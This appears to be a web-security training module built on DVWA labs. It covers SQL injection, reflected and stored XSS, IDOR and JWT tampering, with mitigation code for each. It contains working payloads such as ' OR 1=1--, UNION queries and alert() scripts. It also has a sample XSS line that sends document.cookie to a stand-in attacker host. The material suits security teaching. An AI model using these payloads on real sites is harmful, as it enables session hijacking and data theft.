Week 9 — Web Application Testing

OWASP Top 10, SQL Injection & Cross-Site Scripting

Duration: 4 hours • Format: Lecture + Hands-on Labs + Assessment

Module Overview

This module trains learners to identify, exploit in a controlled lab, and mitigate the most common web vulnerabilities (OWASP Top 10 — focus: Injection, XSS, Broken Access Control).

Labs use DVWA (Damn Vulnerable Web Application) and Burp Suite (Community Edition).

⚠️ Safety Warning: All exercises must be run in the lab VM / local DVWA environment. Never test on public or production systems without explicit written authorization.

What You'll Learn

  • Understanding the OWASP Top 10 vulnerabilities
  • Hands-on exploitation techniques in a safe environment
  • Security testing tools: Burp Suite, cURL, browser DevTools
  • Mitigation strategies and secure coding practices

Learning Outcomes

By the end of this module, learners will be able to:

  • Explain and map OWASP Top 10 categories relevant to web applications and APIs. The OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications.
  • Use security tools including Burp Suite, cURL, and terminal utilities to intercept and modify HTTP traffic. Understanding these tools is crucial as they form the backbone of web penetration testing.
  • Exploit vulnerabilities including SQLi and XSS in a lab environment and document comprehensive Proof of Concept (PoC). Exploitation helps in understanding the impact, but always remember to focus on ethical practices.
  • Design secure mitigations using prepared statements, output encoding, Content Security Policy (CSP), and authorization checks. Mitigation is as important as detection to prevent real-world attacks.
  • Understand ethical implications of security testing and legal requirements. Always obtain permission and follow laws like CFAA.

Prerequisites

  • Basic understanding of HTTP protocol (GET, POST, headers, cookies). HTTP is the foundation of data communication on the web, and knowing its components is essential for identifying vulnerabilities.
  • Familiarity with HTML and JavaScript. These are client-side technologies often exploited in XSS attacks.
  • Basic command line skills. Comfort with terminals speeds up tool usage like cURL.
  • Understanding of database fundamentals (SQL). SQL knowledge helps in crafting and understanding injection attacks.

Lab 1 — SQL Injection (45 minutes)

Objective

Learn to identify and exploit SQL injection vulnerabilities, understand their impact, and implement proper mitigations. SQL injection occurs when user input is improperly sanitized, allowing attackers to manipulate database queries. This can lead to data leakage, modification, or even full system compromise.

Setup Instructions

  1. Install DVWA locally or run the provided VM (available on DVWA GitHub). Ensure PHP and MySQL are set up correctly.
  2. Set DVWA Security level to LOW to start with basic vulnerabilities.
  3. Open Burp Suite (Community Edition) and configure it as a proxy.
  4. Configure your browser proxy to localhost:8080. Test by intercepting a request.

Step-by-Step Exploitation

SQL injection exploits often involve breaking out of the intended query structure. For example, in a query like SELECT * FROM users WHERE id = '$input', injecting ' OR 1=1-- alters it to always true.

  1. Navigate to DVWA → SQL Injection module.
  2. Intercept the request using Burp Proxy or send directly to Repeater.
  3. Test with basic payload: ' OR 1=1-- . This closes the quote, adds a true condition, and comments out the rest.
  4. Observe authentication bypass or response differences. If successful, it dumps all users.
  5. Try extracting table values using union-based techniques, e.g., ' UNION SELECT database(), user()-- to get DB info.
  6. Document your findings with screenshots, including request/response in Burp.

Common mistakes: Forgetting the space after --, or not handling different DBMS syntax (MySQL vs. PostgreSQL).

Mitigation Strategies

Primary Defense: Use prepared statements (parameterized queries) to separate code from data.

// Vulnerable code (PHP)
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";

// Secure code with prepared statement (PHP PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);

// In Python with SQLite
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))

Additional Defenses:

  • Input validation and sanitization: Use whitelists for expected formats, e.g., integers only for IDs.
  • Least privilege database accounts: Limit DB user to SELECT/INSERT as needed, no DROP.
  • Web Application Firewall (WAF) rules: Detect patterns like ' OR 1=1.
  • Regular security audits: Use tools like SQLMap for automated testing.

Remember, even with mitigations, layered security is key as no single measure is foolproof.

Lab 2 — Cross-Site Scripting (XSS) (30 minutes)

Objective

Understand reflected and stored XSS vulnerabilities, their exploitation techniques, and effective countermeasures. XSS allows attackers to inject client-side scripts into web pages viewed by other users, potentially stealing data or defacing sites. It's one of the most common web vulnerabilities due to improper output encoding.

Part A: Reflected XSS

Reflected XSS occurs when user input is immediately returned in the response without sanitization, often via URL parameters.

  1. Navigate to DVWA → XSS (Reflected).
  2. Inject test payload: <script>alert('XSS')</script>. If it pops an alert, it's vulnerable.
  3. Use Burp Repeater to test variations, like <img src="x" onerror="alert('XSS')"> for event-based.
  4. Observe how the payload executes in the browser. Note that it's non-persistent.

Part B: Stored XSS

Stored XSS is more dangerous as the payload is saved in the database and served to all users, enabling worm-like propagation.

  1. Navigate to DVWA → XSS (Stored).
  2. Post the payload in a feedback/comment field.
  3. Reload the page to see the payload trigger automatically for any viewer.
  4. Understand the persistence and impact difference: Stored affects multiple users without interaction.

Real-World Attack Scenarios

Attackers could use XSS to:

  • Steal session cookies: <script>fetch('https://attacker.com/?c='+document.cookie)</script>. This leads to session hijacking.
  • Redirect users to phishing sites: <script>window.location='fakebank.com';</script>.
  • Inject keyloggers: Capture keystrokes and send to attacker server.
  • Deface web pages: Alter DOM to change content visually.
Lab Safety: Use only harmless alert() payloads in the lab environment. Never exfiltrate actual data.

Mitigation Strategies

1. Output Encoding: Always encode user input when rendering to prevent interpretation as code.

// PHP example
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// JavaScript example (safe)
element.textContent = userInput; // Treats as text

// Dangerous!
element.innerHTML = userInput;

2. Content Security Policy (CSP): Restrict sources for scripts and other resources.

Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

3. Input Validation: Validate on server-side, not just client.

  • Whitelist allowed characters: e.g., alphanumeric only for usernames.
  • Validate data types and formats: Use regex for emails, numbers.
  • Use framework-provided sanitization: Like Laravel's e() or Django's escape.

Avoid common pitfalls like relying solely on client-side validation, which can be bypassed.

Lab 3 — Broken Access Control / IDOR (20 minutes)

Objective

Identify Insecure Direct Object Reference (IDOR) vulnerabilities and understand proper authorization implementation. Broken access control allows users to access resources they shouldn't, often due to missing server-side checks, leading to data breaches.

Exploitation Steps

  1. Login as a low-privilege user on the lab application.
  2. Inspect a resource URL like /profile.php?user=2.
  3. Modify the parameter to user=1 or other values using Burp or browser.
  4. Observe if you can access other users' data. If yes, it's IDOR.
  5. Try different resource types (files, API endpoints, etc.), e.g., incrementing invoice IDs.

Why it works: The app trusts client-supplied references without verifying ownership.

Understanding the Vulnerability

IDOR occurs when:

  • Applications expose internal object references (IDs, filenames) directly.
  • Authorization checks are missing or insufficient on the server.
  • Users can manipulate parameters to access unauthorized resources, like viewing others' profiles.

Real-world impact: Major data leaks, e.g., exposing user PII by guessing IDs.

Mitigation Strategies

// Vulnerable code
$userId = $_GET['user'];
$query = "SELECT * FROM profiles WHERE id = $userId";

// Secure code with authorization check (PHP)
$userId = $_GET['user'];
$currentUser = $_SESSION['user_id'];

if ($userId != $currentUser && !isAdmin($currentUser)) {
    die("Access denied");
}
$query = "SELECT * FROM profiles WHERE id = $userId";

// In Node.js
if (req.params.id !== req.user.id && !req.user.isAdmin) {
  return res.status(403).send('Access denied');
}

Best Practices:

  • Always validate authorization on the server side: Check if user owns the resource.
  • Use indirect references: Map user-submitted IDs to internal IDs via sessions.
  • Implement role-based access control (RBAC): Libraries like Spring Security or Laravel Gates.
  • Log and monitor access attempts: Detect patterns of ID guessing.

Test mitigations by re-running exploits after fixes to ensure effectiveness.

Lab 4 — JWT Tampering (Optional, 30 minutes)

Objective

Understand JSON Web Token structure, common misconfigurations, and proper implementation. JWTs are used for authentication, but weak implementations lead to tampering and privilege escalation.

JWT Structure

A JWT consists of three Base64-encoded parts separated by dots: header (algorithm, type), payload (claims like user, role), signature (verification).

header.payload.signature

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature

Exploitation Steps

  1. Capture a JWT from an API response or cookie using Burp.
  2. Decode header & payload using jwt.io or Burp Decoder. Inspect claims.
  3. Examine the claims (user, role, expiry, etc.).
  4. If signature validation is weak, modify claims (e.g., change "role":"user" to "role":"admin"). Re-sign if key is known or none alg.
  5. Re-encode and test the modified token in requests.

Common issue: Accepting 'alg': 'none' removes signature check.

Common Vulnerabilities

  • Algorithm Confusion: Changing "alg" from "RS256" to "none" or "HS256" with public key as secret.
  • Weak Secrets: Brute-forcing HMAC keys if short or predictable.
  • Missing Signature Validation: Accepting unsigned tokens.
  • Key Confusion: Using public key as HMAC secret.

Secure Implementation

// Node.js example with proper validation
const jwt = require('jsonwebtoken');
const SECRET = process.env.JWT_SECRET; // Strong, random secret

// Creating token
const token = jwt.sign(
    { userId: user.id, role: user.role },
    SECRET,
    { expiresIn: '1h', algorithm: 'HS256' }
);

// Validating token
try {
    const decoded = jwt.verify(token, SECRET, { algorithms: ['HS256'] });
    // Proceed with decoded.userId and decoded.role
} catch(err) {
    // Token invalid or expired
    return res.status(401).send('Invalid token');
}

// In Python with PyJWT
import jwt
decoded = jwt.decode(token, SECRET, algorithms=['HS256'])

Best Practices:

  • Always validate signatures server-side with specified algorithms.
  • Use strong, random secrets (minimum 256 bits), store in env vars.
  • Set short expiration times (15-60 minutes) and use refresh tokens.
  • Rotate keys regularly and invalidate old tokens.
  • Explicitly specify allowed algorithms to prevent downgrades.
  • Store tokens securely (HttpOnly cookies, not localStorage) to prevent XSS theft.

Avoid storing sensitive data in JWT payloads as they are base64, not encrypted.
